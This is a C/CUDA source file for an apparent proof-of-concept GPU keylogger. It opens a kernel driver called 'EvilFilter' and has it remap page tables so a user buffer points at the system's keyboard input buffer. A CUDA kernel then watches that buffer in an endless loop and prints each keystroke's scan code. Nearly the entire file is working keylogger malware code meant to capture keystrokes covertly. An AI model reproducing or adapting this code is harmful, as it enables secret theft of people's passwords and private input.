#include "stdafx.h"
#include <SharedHeader.h>
#include <stdio.h>
#include <kernelspecs.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <io.h>
#include <windows.h>
#include <winbase.h>
#include <cuda.h>
#include <cuda_runtime.h>
#include "helper_cuda.h"
#include "device_launch_parameters.h"
#include <DbgEng.h>
#include <process.h>
#include <psapi.h>

// define DEBUG to see evidence of keystrokes being logged by the
// GPU, via printf()s emitted by the CUDA kernel 

#define DEBUG 1

__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData) { // , PCHAR KeyMap
	USHORT lastFlag = 0;
	while (TRUE) {
		if (lastFlag != keyboardData->Flags) { // keyboardData->MakeCode != 0
			printf(" %s SC:[0x%x] [c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx]", // [%c]
				keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
				keyboardData->MakeCode,
//				KeyMap[keyboardData->MakeCode],
				keyboardData->UnitId,
				keyboardData->Flags,
				keyboardData->Reserved,
				keyboardData->ExtraInformation);
			printf(" raw:");
			PCHAR p = (PCHAR)keyboardData;
			for (int i = 0; i < 12; i++) {
				printf("[0x%x]", p[i]);

			}
			printf("\n");
			lastFlag = keyboardData->Flags;
		}
	}
}

__global__ void l(unsigned char *v,
	unsigned char *ks,
	unsigned long *ki,
	unsigned char *p0,
	unsigned char *p2) {




}

VOID WaitAMinute() {
	printf("Waiting a minute...");
	SYSTEMTIME systemTime;
	GetSystemTime(&systemTime);
	WORD CurrentMinute = systemTime.wMinute;
	WORD ExitMinute;
	if (systemTime.wSecond > 30) {
		ExitMinute = systemTime.wMinute + 2;
	}
	else {
		ExitMinute = systemTime.wMinute + 1;
	}
	//while (FALSE) {
	while (CurrentMinute != ExitMinute) {
		GetSystemTime(&systemTime);
		CurrentMinute = systemTime.wMinute;
	}
	printf("done waiting\n");
}

/**
 * The overall strategy here is to make 2 calls to the driver obkect 
 * - the first is to get the offset for the pointer to the keyboard buffer
 * Then I loop through allocating variables until I get one with the correct 
 * offset.  
 * - the second call is with the pointer that has an identical offset
 * so that the driver can remap its page to the page with the keyboard buffer
 * 
 * once I have the maspped pointer I pass it to the CUDA routine so that it can begin monitoring it
 */
int main(int argc, _TCHAR* argv[]) {
#define IOCTL_CUSTOM_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
	HANDLE hControlDevice;
	ULONG  bytes;

	hControlDevice = CreateFile(TEXT("\\\\.\\EvilFilter"),
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, //0, // FILE_SHARE_READ | FILE_SHARE_WRITE
		NULL, // no SECURITY_ATTRIBUTES structure
		OPEN_EXISTING, // No special create flags
		0, //  No special attributes
		NULL); // No template file

	if (INVALID_HANDLE_VALUE == hControlDevice) {
		printf("Failed to open EvilFilter device\n");
	}
	else {

		PKEYBOARD_INPUT_DATA keyboardData;
		PKEYBOARD_INPUT_DATA cudaKeyboardData;
		PSHARED_MEMORY_STRUCT dataToTransmit;
		//OVERLAPPED      DeviceIoOverlapped;

		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);
		dataToTransmit->instruction = 'O';
		dataToTransmit->offset = 0;

		//DeviceIoOverlapped.Offset = 0;
		//DeviceIoOverlapped.OffsetHigh = 0;
		//DeviceIoOverlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

		if (!DeviceIoControl(hControlDevice,
			IOCTL_CUSTOM_CODE,
			NULL, 0,
			dataToTransmit, SharedMemoryLength,
			&bytes, 
			NULL //&DeviceIoOverlapped
			)) {
			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
		}
		else {
			ULONG kmdfOffset;
			ULONG keyboardOffset;
			PVOID ppde;
			PVOID ppte;
			PLLIST listNode;

			kmdfOffset = dataToTransmit->offset;
			keyboardOffset = (ULONG)keyboardData & 0x0fff;
			printf("Ioctl to EvilFilter device succeeded...offsets are [0x%lx] [0x%lx]\n", kmdfOffset, keyboardOffset);
			keyboardOffset = (ULONG)keyboardData & 0x0fff;
			printf("keyboardData is [0x%lx] offset is [0x%lx].\n", keyboardData, keyboardOffset);
			listNode = (PLLIST)malloc(sizeof(LLIST));
			listNode->keyboardBuffer = keyboardData;
			listNode->previous = NULL;
			while (keyboardOffset != kmdfOffset) {
				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
				keyboardOffset = (ULONG)keyboardData & 0x0fff;
				PLLIST previousListNode = listNode;
				listNode = (PLLIST)malloc(sizeof(LLIST));
				listNode->keyboardBuffer = keyboardData;
				listNode->previous = previousListNode;
			}

			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
			while (listNode != NULL) {
				PLLIST currentListNode = listNode;
				listNode = listNode->previous;
				if (currentListNode->keyboardBuffer != keyboardData) {
					free(currentListNode->keyboardBuffer);
				}
				free(currentListNode);
			}
			ppde = GetPdeAddress(keyboardData);
			ppte = GetPteAddress(keyboardData);
			printf("Page Directory is [0x%lx] Page Table is [0x%lx]\n", ppde, ppte);

			dataToTransmit->ClientMemory = keyboardData;
			dataToTransmit->PageDirectory = ppde;
			dataToTransmit->PageTable = ppte;
			dataToTransmit->instruction = 'E';

			if (!DeviceIoControl(hControlDevice,
				IOCTL_CUSTOM_CODE,
				NULL, 0,
				dataToTransmit, SharedMemoryLength,
				&bytes, 
				NULL // &DeviceIoOverlapped
				)) {
				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
			}
			else {
				printf("Ioctl to EvilFilter device succeeded \n");
				printf("keyboardData=[0x%lx]\n", keyboardData);
				printf(" we now have the real keyboard buffer!!!\n");
				//send address to GPU

				checkCudaErrors(cudaSetDevice(0));
				checkCudaErrors(cudaSetDeviceFlags(cudaDeviceMapHost));

				printf("Registering...");
				checkCudaErrors(cudaHostRegister(keyboardData, 10 * sizeof(char), cudaHostRegisterMapped));
				printf("getting device pointer...");
				checkCudaErrors(cudaHostGetDevicePointer((void **)&cudaKeyboardData, (void *)keyboardData, 0));

				printf("Launching CUDA process...");
				dim3 grid(1);
				dim3 block(1); 
				logKeyboardData <<<grid, block >>>(cudaKeyboardData);
				checkCudaErrors(cudaDeviceSynchronize());
				printf("Launched.\n");
			}
		}
		CloseHandle(hControlDevice);
	}
	printf("fin.\n");
	return 0;
}


PVOID GetPdeAddress(PVOID virtualaddr) {
	//ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 21;
	ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 22;
	printf("\n\nVirtualAddress [0x%lx] pageDirectoryIndex is [0x%lx]\n", virtualaddr, pageDirectoryIndex);
	PVOID pageDirectory = (PVOID)(PROCESS_PAGE_DIRECTORY_BASE + (pageDirectoryIndex * PTE_SIZE));
	printf("pageDirectoryTable   [0x%lx] ", pageDirectory);
	if ((pageDirectory)) {
		return pageDirectory;
	}
	else {
		printf(" is INVALID\n");
		return NULL;
	}
}

PVOID GetPteAddress(PVOID virtualaddr) {
	//ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 21;
	//ULONG pageTableIndex = (ULONG)virtualaddr >> 12 & 0x01FF;
	ULONG pageDirectoryIndex = (ULONG)virtualaddr >> 22;
	ULONG pageTableIndex = (ULONG)virtualaddr >> 12 & 0x03FF;
	PVOID pageTable = (PVOID)(PROCESS_PAGE_TABLE_BASE + (pageTableIndex * PTE_SIZE) + (PAGE_SIZE * pageDirectoryIndex));
	printf("pageTable   [0x%lx] \n", pageTable);
	if ((pageTable)) {
		return pageTable;
	}
	else {
		printf(" is INVALID\n");
		return NULL;
	}
}


/*
// for testing keystroke detection in userspace--move after
// remap of PTE by kernel driver to test
while (strokes < 100) {
stroke=0;
for (k=0; k < 8 && ! stroke; k++) {
stroke = (((char *)v)[k]);
}
if (stroke) {
strokes++;
for (k=0; k < 8; k++) {
printf("HOST: %d %d %d %d %d %d %d %d\n",
v[0],
v[1],
v[2],
v[3],
v[4],
v[5],
v[6],
v[7]);
}
}
}
*/

